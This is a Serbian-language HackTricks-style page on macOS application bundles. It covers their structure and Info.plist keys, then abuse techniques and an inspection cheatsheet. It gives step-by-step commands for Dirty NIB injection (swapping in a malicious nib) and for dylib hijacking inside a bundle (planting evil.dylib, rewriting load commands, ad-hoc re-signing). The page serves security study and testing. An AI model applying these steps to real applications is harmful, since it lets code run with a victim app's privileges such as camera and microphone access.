# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Bundles u macOS-u služe kao kontejneri za različite resurse, uključujući aplikacije, biblioteke i druge neophodne fajlove, zbog čega se u Finder-u prikazuju kao pojedinačni objekti, poput poznatih `*.app` fajlova. Najčešći bundle je `.app` bundle, mada su rasprostranjeni i drugi tipovi kao što su `.framework`, `.systemextension` i `.kext`.

### Osnovne komponente bundle-a

Unutar bundle-a, naročito u direktorijumu `<application>.app/Contents/`, nalaze se različiti važni resursi:

- **\_CodeSignature**: Ovaj direktorijum čuva detalje code-signing-a koji su neophodni za proveru integriteta aplikacije. Informacije o code-signing-u možete pregledati pomoću komandi kao što su:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Sadrži izvršni binarni fajl aplikacije koji se pokreće nakon interakcije korisnika.
- **Resources**: Spremište komponenti korisničkog interfejsa aplikacije, uključujući slike, dokumente i opise interfejsa (nib/xib fajlovi).
- **Info.plist**: Služi kao glavna konfiguraciona datoteka aplikacije i ključna je za to da sistem pravilno prepozna aplikaciju i komunicira sa njom.

#### Važni ključevi u Info.plist

Datoteka `Info.plist` predstavlja osnovu konfiguracije aplikacije i sadrži ključeve kao što su:

- **CFBundleExecutable**: Navodi ime glavnog izvršnog fajla koji se nalazi u direktorijumu `Contents/MacOS`.
- **CFBundleIdentifier**: Obezbeđuje globalni identifikator aplikacije, koji macOS intenzivno koristi za upravljanje aplikacijama.
- **LSMinimumSystemVersion**: Označava minimalnu verziju macOS-a potrebnu za pokretanje aplikacije.

### Istraživanje Bundles

Za istraživanje sadržaja bundle-a, kao što je `Safari.app`, može se koristiti sledeća komanda: `bash ls -lR /Applications/Safari.app/Contents`

Ovo istraživanje otkriva direktorijume kao što su `_CodeSignature`, `MacOS`, `Resources` i fajlove kao što je `Info.plist`, pri čemu svaki ima posebnu svrhu, od zaštite aplikacije do definisanja njenog korisničkog interfejsa i operativnih parametara.

#### Dodatni direktorijumi Bundle-a

Pored uobičajenih direktorijuma, bundles mogu da sadrže i:

- **Frameworks**: Sadrži frameworks koje aplikacija koristi. Frameworks su slični dylibs fajlovima, ali sa dodatnim resursima.
- **PlugIns**: Direktorijum za plug-ins i ekstenzije koje proširuju mogućnosti aplikacije.
- **XPCServices**: Sadrži XPC services koje aplikacija koristi za komunikaciju van procesa.

Ova struktura obezbeđuje da sve neophodne komponente budu obuhvaćene bundle-om, čime se omogućava modularno i bezbedno okruženje aplikacije.

Za detaljnije informacije o ključevima `Info.plist` i njihovom značenju, Apple developer dokumentacija pruža opsežne resurse: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Bezbednosne napomene i Abuse Vectors

- **Gatekeeper / App Translocation**: Kada se quarantined bundle prvi put izvrši, macOS obavlja detaljnu proveru potpisa i može da ga pokrene sa randomizovane translocated putanje. Nakon prihvatanja, naredna pokretanja obavljaju samo površinske provere; resource fajlovi u `Resources/`, `PlugIns/`, nib fajlovi itd. istorijski nisu bili proveravani. Od macOS 13 Ventura, detaljna provera se sprovodi pri prvom pokretanju, a nova TCC dozvola *App Management* ograničava third-party procese u izmeni drugih bundles bez pristanka korisnika, ali stariji sistemi i dalje ostaju ranjivi.
- **Kolizije Bundle Identifier-a**: Više ugrađenih targets (PlugIns, helper tools) koji ponovo koriste isti `CFBundleIdentifier` mogu pokvariti validaciju potpisa i povremeno omogućiti hijacking/confusion URL scheme-ova. Uvek enumerišite sub-bundles i proverite da li imaju jedinstvene ID-jeve.

## Resource Hijacking (Dirty NIB / NIB Injection)

Pre Ventu­re, zamena UI resources u potpisanoj aplikaciji mogla je da zaobiđe površinsko code signing proveravanje i omogući code execution sa entitlements aplikacije. Trenutno istraživanje (2024) pokazuje da ovo i dalje funkcioniše na sistemima starijim od Ventu­re i u buildovima bez quarantine-a:<sup>[[1]](#references)[[2]](#references)</sup>

1. Kopirajte ciljnu aplikaciju na lokaciju sa dozvolom upisa (npr. `/tmp/Victim.app`).
2. Zamenite `Contents/Resources/MainMenu.nib` (ili bilo koji nib naveden u `NSMainNibFile`) malicious nib fajlom koji instancira `NSAppleScript`, `NSTask` itd.
3. Pokrenite aplikaciju. Malicious nib se izvršava pod bundle ID-jem i entitlements-ima žrtve (TCC grants, mikrofon/kamera itd.).
4. Ventura+ ublažava ovaj problem detaljnom proverom bundle-a pri prvom pokretanju i zahtevom za *App Management* dozvolom pri kasnijim izmenama, zbog čega je persistence teži, ali napadi pri prvom pokretanju na starijim verzijama macOS-a i dalje važe.<sup>[[1]](#references)</sup>

Minimalni primer malicious nib payload-a (kompajlirajte xib u nib pomoću `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking unutar Bundles

Pošto `@rpath` pretrage daju prednost Frameworks/PlugIns unutar Bundles, ubacivanje zlonamerne biblioteke u `Contents/Frameworks/` ili `Contents/PlugIns/` može preusmeriti redosled učitavanja kada je glavni binary potpisan bez library validation mehanizma ili sa slabim redosledom `LC_RPATH` putanja.

Tipični koraci pri zloupotrebi unsigned/ad-hoc Bundle-a:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Napomene:
- Hardened runtime bez `com.apple.security.cs.disable-library-validation` blokira dylib biblioteke trećih strana; prvo proverite entitlements.
- XPC services u `Contents/XPCServices/` često učitavaju sibling frameworks — na sličan način izmenite njihove binarne datoteke za persistence ili privilege escalation putanje.

## Cheatsheet za brzu inspekciju
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Reference

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
